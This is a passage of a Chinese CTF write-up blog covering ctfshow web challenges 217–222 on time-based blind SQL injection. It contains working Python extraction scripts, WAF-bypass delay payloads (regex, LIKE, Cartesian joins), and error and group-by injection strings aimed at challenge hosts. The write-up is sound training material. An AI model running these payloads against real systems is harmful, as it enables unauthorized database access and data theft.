class="number">1</span>)),<span class="number">0</span>)<span class="string">"</span></span><br><span class="line"><span class="string">#payload = "</span><span class="number">1</span>) <span class="keyword">and</span> <span class="keyword">if</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()),&#123;&#125;,<span class="number">1</span>)=<span class="string">'&#123;&#125;'</span>,<span class="keyword">benchmark</span>(<span class="number">5000000</span>,<span class="keyword">sha</span>(<span class="number">1</span>)),<span class="number">0</span>) <span class="comment">#"</span></span><br><span class="line"><span class="comment">#payload = "1) and if(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='ctfshow_flagxccb'),&#123;&#125;,1)='&#123;&#125;',benchmark(5000000,sha(1)),0) #"</span></span><br><span class="line">payload = <span class="string">"1) and if(substr((select group_concat(flagaabc) from ctfshow_flagxccb),&#123;&#125;,1)='&#123;&#125;',benchmark(5000000,sha(1)),0) #"</span></span><br><span class="line"></span><br><span class="line">n = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">range</span>(<span class="number">0</span>, <span class="number">666</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="keyword">str</span>:</span><br><span class="line">        <span class="keyword">data</span> = &#123;</span><br><span class="line">            <span class="string">"ip"</span>: payload.format(i,j),</span><br><span class="line">            <span class="string">"debug"</span>: <span class="string">'0'</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">start</span> = time.time()</span><br><span class="line">        res = requests.post(<span class="keyword">url</span>, <span class="keyword">data</span>)</span><br><span class="line">        <span class="keyword">end</span> = time.time()</span><br><span class="line">        <span class="comment"># print(end-start)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">end</span> - <span class="keyword">start</span> &gt; <span class="number">1.4</span> <span class="keyword">and</span> <span class="keyword">end</span> - <span class="keyword">start</span> &lt; <span class="number">4.9</span>:</span><br><span class="line">            flag += j</span><br><span class="line">            n += <span class="number">1</span></span><br><span class="line">            print(<span class="string">'[*] 开始盲注第&#123;&#125;位'</span>.format(n))</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">if</span> j == <span class="string">"&#125;"</span>:</span><br><span class="line">                print(<span class="string">'[*] flag is &#123;&#125;'</span>.format(flag))</span><br><span class="line">                <span class="keyword">exit</span>()</span><br><span class="line">            break</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210731193548774.png" alt="image-20210731193548774"></p>
<h2 id="web218"><a href="#web218" class="headerlink" title="web218"></a>web218</h2><blockquote>
<ul>
<li>这题过滤了benchmark，不过还有RLIKE REGEXP正则匹配</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> rpad(<span class="string">'a'</span>,<span class="number">4999999</span>,<span class="string">'a'</span>) <span class="keyword">RLIKE</span> <span class="keyword">concat</span>(<span class="keyword">repeat</span>(<span class="string">'(a.*)+'</span>,<span class="number">30</span>),<span class="string">'b'</span>);</span><br><span class="line">​</span><br><span class="line">正则语法：</span><br><span class="line">. : 匹配任意单个字符</span><br><span class="line">* ： 匹配0个或多个前一个得到的字符</span><br><span class="line">[] : 匹配任意一个[]内的字符，[ab]*可匹配空串、a、b、或者由任意个a和b组成的字符串。</span><br><span class="line">^ : 匹配开头，如^s匹配以s或者S开头的字符串。</span><br><span class="line">$ : 匹配结尾，如s$匹配以s结尾的字符串。</span><br><span class="line">&#123;n&#125; : 匹配前一个字符反复n次。</span><br><span class="line"></span><br><span class="line">RPAD(str,len,padstr)</span><br><span class="line">用字符串 padstr对 str进行右边填补直至它的长度达到 len个字符长度，然后返回 str。如果 str的长度长于 len'，那么它将被截除到 len个字符。</span><br><span class="line">mysql&gt; SELECT RPAD('hi',5,'?'); -&gt; 'hi???'</span><br><span class="line">​</span><br><span class="line">repeat(str,times)  复制字符串times次</span><br></pre></td></tr></table></figure></div>

<p>所以我们可以利用这个来进行构造延时函数</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">concat(rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;)) RLIKE &#39;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#39;</span><br></pre></td></tr></table></figure></div>

<p>以上代码预估等于<code>sleep(5)</code>效果，具体根据网速和性能判断，利用此性质写将上面的代码更改一下，跑flag</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># Date:2021/7/31</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">bypass=<span class="string">"concat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')) RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b'"</span></span><br><span class="line">url = <span class="string">"http://4f04cb91-f6ed-43ce-bc4d-539d9c5b2a7b.challenge.ctf.show:8080/api/"</span></span><br><span class="line">str = <span class="string">"01234567890abcdefghijklmnopqrstuvwxyz&#123;&#125;-()_,，"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="comment">#1) and  if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1)='c',( concat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')) RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b'),0)#</span></span><br><span class="line"><span class="comment">#求表payload = "1) and  if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1)='&#123;&#125;',(&#123;&#125;),0)#"</span></span><br><span class="line"><span class="comment">#payload = "1) and  if(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='ctfshow_flagxc'),&#123;&#125;,1)='&#123;&#125;',(&#123;&#125;),0)#"</span></span><br><span class="line">payload = <span class="string">"1) and  if(substr((select group_concat(flagaac) from ctfshow_flagxc),&#123;&#125;,1)='&#123;&#125;',(&#123;&#125;),0)#"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">666</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">"ip"</span>: payload.format(i,j,bypass),</span><br><span class="line">            <span class="string">"debug"</span>: <span class="string">'0'</span></span><br><span class="line">        &#125;</span><br><span class="line">        start = time.time()</span><br><span class="line">        res = requests.post(url, data)</span><br><span class="line">        end = time.time()</span><br><span class="line">        <span class="keyword">if</span> end - start &gt; <span class="number">0.4</span> <span class="keyword">and</span> end - start &lt; <span class="number">1</span>:</span><br><span class="line">            flag += j</span><br><span class="line">            n += <span class="number">1</span></span><br><span class="line">            print(<span class="string">'[*] 开始盲注第&#123;&#125;位'</span>.format(n))</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">if</span> j == <span class="string">"&#125;"</span>:</span><br><span class="line">                print(<span class="string">'[*] flag is &#123;&#125;'</span>.format(flag))</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210731232314453.png" alt="image-20210731232314453"></p>
<h2 id="web219"><a href="#web219" class="headerlink" title="web219"></a>web219</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;屏蔽危险分子</span><br><span class="line">function waf($str)&#123;</span><br><span class="line">    return preg_match(&#39;&#x2F;sleep|benchmark|rlike&#x2F;i&#39;,$str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<blockquote>
<ul>
<li><strong>这题吧RLIKE给禁了，我发现把RLIKE换成LIke一样可以，继续上把代码改一下，不过需要注意跟你家网速有关，网速好，一次flag就对，不好就多对比几下</strong></li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># Date:2021/7/31</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">bypass=<span class="string">"concat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')) LIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b'"</span></span><br><span class="line">url = <span class="string">"http://ea12a2f3-655e-44f2-b249-a95701399f73.challenge.ctf.show:8080/api/"</span></span><br><span class="line">str = <span class="string">"01234567890abcdefghijklmnopqrstuvwxyz&#123;&#125;-()_,，"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="comment">#1) and  if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1)='c',( concat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')) RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b'),0)#</span></span><br><span class="line"><span class="comment">#payload = "1) and  if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1)='&#123;&#125;',(&#123;&#125;),0)#"</span></span><br><span class="line"><span class="comment">#payload = "1) and  if(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='ctfshow_flagxca'),&#123;&#125;,1)='&#123;&#125;',(&#123;&#125;),0)#"</span></span><br><span class="line">payload = <span class="string">"1) and  if(substr((select group_concat(flagaabc) from ctfshow_flagxca),&#123;&#125;,1)='&#123;&#125;',(&#123;&#125;),0)#"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">666</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">"ip"</span>: payload.format(i,j,bypass),</span><br><span class="line">            <span class="string">"debug"</span>: <span class="string">'0'</span></span><br><span class="line">        &#125;</span><br><span class="line">        start = time.time()</span><br><span class="line">        res = requests.post(url, data)</span><br><span class="line">        end = time.time()</span><br><span class="line">        print(end - start)</span><br><span class="line">        <span class="keyword">if</span> end - start &gt; <span class="number">0.22</span> <span class="keyword">and</span> end - start &lt; <span class="number">0.5</span>:</span><br><span class="line">            flag += j</span><br><span class="line">            n += <span class="number">1</span></span><br><span class="line">            print(<span class="string">'[*] 开始盲注第&#123;&#125;位'</span>.format(n))</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">if</span> j == <span class="string">"&#125;"</span>:</span><br><span class="line">                print(<span class="string">'[*] flag is &#123;&#125;'</span>.format(flag))</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="comment">#ctfshow&#123;92286539-ff05-4292-bcbf-7ff6fa6e31ab&#125;</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210731235226222.png" alt="image-20210731235226222"></p>
<p>第二种思路，鉴于我发现我上面的方法，flag需要多跑几次，而且方法重样，所以想多写一个其他的绕过方法，<strong>笛卡尔积时间延时法</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">笛卡尔积(因为连接表是一个很耗时的操作)</span><br><span class="line">    AxB=A和B中每个元素的组合所组成的集合，就是连接表</span><br><span class="line">    <span class="keyword">SELECT</span> <span class="keyword">count</span>(*) <span class="keyword">FROM</span> information_schema.columns A, information_schema.columns B, information_schema.tables C;</span><br><span class="line">    <span class="keyword">select</span> * <span class="keyword">from</span> table_name A, table_name B</span><br><span class="line">    <span class="keyword">select</span> * <span class="keyword">from</span> table_name A, table_name B，table_name C</span><br><span class="line">    <span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> table_name A, table_name B，table_name C  表可以是同一张表</span><br></pre></td></tr></table></figure></div>

<p><strong>也就是换个bypass也而已，跑起来，这次成功率提高了很多，基本一次能跑成功</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># Date:2021/8/1</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">bypass=<span class="string">"select count(*) from information_schema.schemata a, information_schema.tables b, information_schema.tables c, information_schema.schemata d, information_schema.schemata e"</span></span><br><span class="line">url = <span class="string">"http://ea12a2f3-655e-44f2-b249-a95701399f73.challenge.ctf.show:8080/api/"</span></span><br><span class="line">str = <span class="string">"01234567890abcdefghijklmnopqrstuvwxyz&#123;&#125;-()_,，"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="comment">#1) and  if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1)='c',( concat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')) RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b'),0)#</span></span><br><span class="line"><span class="comment">#payload = "1) and  if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1)='&#123;&#125;',(&#123;&#125;),0)#"</span></span><br><span class="line"><span class="comment">#payload = "1) and  if(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='ctfshow_flagxca'),&#123;&#125;,1)='&#123;&#125;',(&#123;&#125;),0)#"</span></span><br><span class="line">payload = <span class="string">"1) and  if(substr((select group_concat(flagaabc) from ctfshow_flagxca),&#123;&#125;,1)='&#123;&#125;',(&#123;&#125;),0)#"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">666</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">"ip"</span>: payload.format(i,j,bypass),</span><br><span class="line">            <span class="string">"debug"</span>: <span class="string">'0'</span></span><br><span class="line">        &#125;</span><br><span class="line">        start = time.time()</span><br><span class="line">        res = requests.post(url, data)</span><br><span class="line">        end = time.time()</span><br><span class="line">        print(end - start)</span><br><span class="line">        <span class="keyword">if</span> end - start &gt; <span class="number">1.5</span> <span class="keyword">and</span> end - start &lt; <span class="number">5</span>:</span><br><span class="line">            flag += j</span><br><span class="line">            n += <span class="number">1</span></span><br><span class="line">            print(<span class="string">'[*] 开始盲注第&#123;&#125;位'</span>.format(n))</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">if</span> j == <span class="string">"&#125;"</span>:</span><br><span class="line">                print(<span class="string">'[*] flag is &#123;&#125;'</span>.format(flag))</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="comment">#ctfshow&#123;92286539-ff05-4292-bcbf-7ff6fa6e31ab&#125;</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210801002919738.png" alt="image-20210801002919738"></p>
<h2 id="web220"><a href="#web220" class="headerlink" title="web220"></a>web220</h2><blockquote>
<ul>
<li>和布尔盲注一样，过滤substr，但是还有正则，或者left都可以，我们这里用正则写一个脚本，因为还过滤了concat所以不能用group_concat改用limit</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># Date:2021/8/1</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">bypass=<span class="string">"select count(*) from information_schema.schemata a, information_schema.tables b, information_schema.tables c, information_schema.schemata d, information_schema.schemata e, information_schema.schemata f"</span></span><br><span class="line">url = <span class="string">"http://d82b1a0b-aba4-4fed-aa83-62d59d7df4ee.challenge.ctf.show:8080/api/"</span></span><br><span class="line">str = <span class="string">"01234567890abcdefghijklmnopqrstuvwxyz&#123;&#125;-()_,，"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="comment">#1) and if((database())regexp('^ctfshow'),(select count(*) from information_schema.schemata a, information_schema.tables b, information_schema.tables c, information_schema.schemata d, information_schema.schemata e, information_schema.schemata f),0)#</span></span><br><span class="line"><span class="comment">#payload = "1) and if((database())regexp('^&#123;&#125;'),(&#123;&#125;),0)#"</span></span><br><span class="line"><span class="comment">#payload = "1) and if((select table_name from information_schema.tables where table_schema=database() limit 0,1)regexp('^&#123;&#125;'),(&#123;&#125;),0)#"</span></span><br><span class="line"><span class="comment">#payload = "1) and if((select column_name from information_schema.columns where table_schema=database() and table_name='ctfshow_flagxcac' limit 1,1)regexp('^&#123;&#125;'),(&#123;&#125;),0)#"</span></span><br><span class="line">payload = <span class="string">"1) and if((select flagaabcc from ctfshow_flagxcac limit 0,1)regexp('^&#123;&#125;'),(&#123;&#125;),0)#"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">666</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">"ip"</span>: payload.format(flag + j,bypass),</span><br><span class="line">            <span class="string">"debug"</span>: <span class="string">'0'</span></span><br><span class="line">        &#125;</span><br><span class="line">        start = time.time()</span><br><span class="line">        res = requests.post(url, data)</span><br><span class="line">        end = time.time()</span><br><span class="line">        <span class="keyword">if</span> end - start &gt; <span class="number">3</span> <span class="keyword">and</span> end - start &lt; <span class="number">5</span>:</span><br><span class="line">            flag += j</span><br><span class="line">            n += <span class="number">1</span></span><br><span class="line">            print(<span class="string">'[*] 开始盲注第&#123;&#125;位'</span>.format(n))</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">if</span> j == <span class="string">"&#125;"</span>:</span><br><span class="line">                print(<span class="string">'[*] flag is &#123;&#125;'</span>.format(flag))</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210801011111531.png" alt="image-20210801011111531"></p>
<h2 id="web221"><a href="#web221" class="headerlink" title="web221"></a>web221</h2><blockquote>
<ul>
<li>考点是：MySQL利用procedure analyse()函数优化表结构<br>limit后面能跟的也只有这个了似乎</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># http://196cf3fd-f920-4018-a714-662ad61571e9.chall.ctf.show/api/?page=1&amp;limit=1 procedure analyse(extractvalue(rand(),concat(0x3a,database())),2)</span></span><br><span class="line"></span><br><span class="line">可以参考</span><br><span class="line"><span class="comment"># https://www.jb51.net/article/99980.htm</span></span><br></pre></td></tr></table></figure></div>

<h2 id="web222"><a href="#web222" class="headerlink" title="web222"></a>web222</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//分页查询</span><br><span class="line">$sql = <span class="keyword">select</span> * <span class="keyword">from</span> ctfshow_user <span class="keyword">group</span> <span class="keyword">by</span> $username;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li><strong>不懂group by建议看一下这一篇关于group报错注入<a href="https://www.cnblogs.com/02SWD/p/CTF-sql-group_by.html，可以理解一下，因为group" target="_blank" rel="noopener">https://www.cnblogs.com/02SWD/p/CTF-sql-group_by.html，可以理解一下，因为group</a> by后面只能跟字段和字符串，所以我们构造字符串，利用<code>concat(sleep(0.10),1)</code>可以成功执行sleep()函数，我们再利用if来条件判断，就可以实现时间盲注，写一个脚本跑一波</strong></li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -- coding:UTF-8 --</span></span><br><span class="line"><span 